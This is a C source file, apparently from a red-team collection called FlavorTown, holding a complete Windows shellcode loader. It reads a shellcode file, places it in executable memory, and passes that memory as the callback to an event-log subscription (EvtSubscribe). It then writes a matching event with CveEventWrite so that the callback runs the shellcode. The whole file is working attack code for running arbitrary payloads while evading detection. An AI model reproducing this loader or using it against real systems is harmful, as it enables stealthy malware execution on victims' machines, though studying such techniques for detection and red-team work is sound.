// Wra7h/FlavorTown
// Written/Compiled: Visual Studio 2022
// Usage: this.exe <shellcode file>
#pragma comment(lib, "Wevtapi.lib")

#include <stdio.h>
#include <Windows.h>
#include <winevt.h>

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;

	EVT_HANDLE hEvent = NULL;

	if (argc != 2)
	{
		printf("Usage: EvtSubscribe_CveEventWrite.exe C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	//Read shellcode and setup
	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	memcpy(hAlloc, Shellcode, SCLen);

	// Setup the event subscription and callback
	hEvent = EvtSubscribe(NULL, NULL, L"Application", L"*[System/EventID=1]", NULL, NULL, (EVT_SUBSCRIBE_CALLBACK)hAlloc, EvtSubscribeToFutureEvents);

	// Generate an event that matches the XPATH query provided to EvtSubscribe
	CveEventWrite(L"2022-123456", L"Wra7h");

	//Wait for the event to be written to the log, which will trigger the callback
	Sleep(10000);

CLEANUP:
	if (Shellcode)
		free(Shellcode);

	if (hEvent)
		EvtClose(hEvent);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}
